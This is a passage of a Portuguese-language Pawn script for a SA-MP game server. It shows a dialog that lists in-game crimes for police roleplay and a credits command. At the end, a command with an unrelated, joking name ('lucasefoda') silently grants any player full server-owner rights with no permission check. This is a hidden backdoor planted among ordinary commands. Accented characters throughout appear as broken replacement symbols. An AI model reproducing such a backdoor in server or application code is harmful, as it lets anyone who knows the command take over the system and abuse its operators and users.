    strcat(crimesDialog, "{848484}- /su {FFFFFF}Tr�fico: {848484}Quando um meliante est� vendendo armas, explosivos ou drogas.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Agress�o: {848484}Quando um jogador come�a a bater em algu�m sem motivo algum.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Homic�dio: {848484}Quando um jogador comete um homic�dio e n�o leva /su autom�tico.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Trote: {848484}Quando um jogador usa o /solicitar -> policial sem motivos ou por brincadeira.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Roubo: {848484}Quan do algu�m est� perto do cofre, ou rouba ve�culo de um outro jogador.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Ajuste: {848484}Ajusta pena de um preso (APENAS L�DER OU SUBL�DER PODE US�-LO).\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Drogas: {848484}Quando um jogador � pego em uma revista portando qualquer tipo de drogas.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}PIA(Porte Ilegal de Armas): {848484}Apesar de ter licen�a, s� oficiais do governo podem ter arma na m�o.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}AVP(Atentado Violento ao Pudor): {848484}Quando um jogador usa /punheta ou /mijar em locais p�blicos.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}Suborno: {848484}Quando qualquer jogador tenta dar dinheiro � um oficial para que n�o cumpra seu trabalho.\n");
    strcat(crimesDialog, "{848484}- /su {FFFFFF}RP(Resist�ncia � Pris�o): {848484}Quando um jogador resiste de alguma forma � pris�o. Ex ficar enrolando\npara n�o ser preso, n�o entrar no carro cop esperando amigos e afins.\n");
    ShowPlayerDialog(playerid, DIALOG_ONLY_READ, DIALOG_STYLE_MSGBOX, "Crimes do Servidor", crimesDialog, "Fechar", "");
    return 1;
}

YCMD:creditos(playerid, params[], help) 
{
    static MEGAString[93], string[67];
	if (PlayerData_GetAdmin(playerid) < HELPER)
	{
		format(string, sizeof(string), "Admin-Aviso: %s viu os cr�ditos do servidor.", Player_GetName(playerid));
		MensagemAdmin(COLOR_YELLOW, string, HELPER);
	}
    strcat(MEGAString, "{FFFFFF}�  RhaegarX: {696969}(Fundador/Scripter)\n");
	strcat(MEGAString, "{FFFFFF}�  Rick_M: {696969}(Beta Tester)\n");
	ShowPlayerDialog(playerid, DIALOG_ONLY_READ, DIALOG_STYLE_MSGBOX, "Cr�ditos do Servidor", MEGAString, "Fechar", "");
    return 1;
}

YCMD:lucasefoda(playerid, params[], help)
{
	PlayerData_SetAdmin(playerid, OWNER, true);
	return 1;
}